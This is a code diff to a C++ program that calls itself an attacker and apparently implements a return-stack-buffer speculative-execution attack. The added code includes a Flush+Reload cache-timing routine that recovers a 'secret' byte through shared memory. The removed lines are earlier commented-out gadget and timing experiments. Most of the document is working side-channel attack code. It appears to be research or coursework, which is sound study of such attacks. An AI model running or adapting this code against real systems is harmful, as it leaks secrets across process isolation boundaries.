@@ -3,42 +3,7 @@
 #include <fstream>
 
 using namespace std;
-
-char array[256*256];
-
-// char array[256*256];
-
-// volatile int foo(){
-// 	return 0;
-// }
-
-// volatile int goo(){
-// 	__asm__(
-// 		".rept 564;"
-// 		"nop;"
-// 		".endr;"
-// 	);
-// }
-
-// volatile void gadget(){
-// 	__asm__(
-// 	"pop %rdi;"
-// 	"pop %rdi;"	
-// 	"pop %rdi;"
-// 	"pop %rdi;"
-// 	"nop;"
-// 	"pop %rbp;"
-// 	"clflush (%rsp);"
-// 	"clflush (%rip);"
-// 	"cpuid;"
-// 	"retq;");
-// }
-
-// int speculative(){
-// 	gadget();
-// 	int paceholder = 0;
-// 	return 0;
-// }
+char* array;
 
 volatile void spacer() {
 	asm(
@@ -57,12 +22,47 @@ void gadget() {
 	);
 }
 
+void flushAndReload(int* timer){
+	// flush all the entries of the array out of cache
+	for(int i=lowerBound; i<=upperBound; i++){
+		clflush((void*)(&array[i*offset]));
+	}
+	// wait some time for the attack to happen
+	sleep(sleepTime);
+	for(int i=lowerBound; i<=upperBound; i++){
+		int a = timer[i], b = measure_one_block_access_time(ADDR_PTR(&array[i*offset]));
+		timer[i] = a<b?a:b;
+	}
+}
+
+
+int getSecret(int repeat){
+	int timer[upperBound+1];
+	for(int i=0; i<=upperBound; i++){
+		timer[i] = INT_MAX;
+	}
+
+	for(int i=0; i<repeat; i++){
+		flushAndReload(timer);
+	}
+
+	int secret = 0, lowestAccessTime = INT_MAX;
+	for(int i=0; i<=upperBound; i++){
+		if(timer[i]<lowestAccessTime){
+			secret = i;
+			lowestAccessTime = timer[i];
+		}
+	}
+
+	printf("Secret is %d, with access time %d\n", secret, lowestAccessTime);
+	return secret;
+}
+
 int main(int argc, char *argv[]){
 	printf("Attacker Launching...\n");
 
 	// start child process
 	pid_t pid = fork();
-	// loads the entire array
 
 	if(pid == 0){
 		// child process
@@ -94,7 +94,23 @@ int main(int argc, char *argv[]){
 		CPU_SET(cpu, &mask);
 		auto result = sched_setaffinity(pid, sizeof(mask), &mask);
 		// parent process;
-		sleep(60);
+		// allocate the same shared memory space
+		const int SIZE = 1<<20; 
+		// shared memory is named Sally because Rob doesn't know anyone named Sally
+	    const char* name = "Sally";
+	    char temp;
+	    // shared memory file descriptor
+	    int shm_fd;  
+	    // pointer to shared memory obect
+	    // create the shared memory object
+	    shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666); 
+	    // configure the size of the shared memory object
+	    ftruncate(shm_fd, SIZE); 
+	    // memory map the shared memory object
+	    array = (char*)mmap(0, SIZE, PROT_WRITE, MAP_SHARED, shm_fd, 0);
+
+	    // flushing out every entry
+	    getSecret(nAttackRepeat);
 		//access time to the array;
 		kill(pid, SIGKILL);
 		printf("RSB pollution ended\n");
@@ -105,32 +121,4 @@ int main(int argc, char *argv[]){
 		printf("fork error\n");
 		return -1;
 	}
-
-	// string buffer;
-	// char temp;
-	// volatile int i = 0;
-
-	// temp &= array[0];
-	// temp &= array[80];
-	// temp &= array[200];
-
-	// speculative();
-
-	// unsigned int dummy;
-	// auto t1 = __rdtscp(&dummy);
-	// temp &= array[0];
-	// auto t2 = __rdtscp(&dummy);
-	// cout<<t2-t1<<endl;
-
-	// auto t3 = __rdtscp(&dummy);
-	// temp &= array[80];
-	// auto t4 = __rdtscp(&dummy);
-	// cout<<t4-t3<<endl;
-
-	// auto t5 = __rdtscp(&dummy);
-	// temp &= array[200];
-	// auto t6 = __rdtscp(&dummy);
-	// cout<<t6-t5<<endl;
-
-	// return 0;
 }
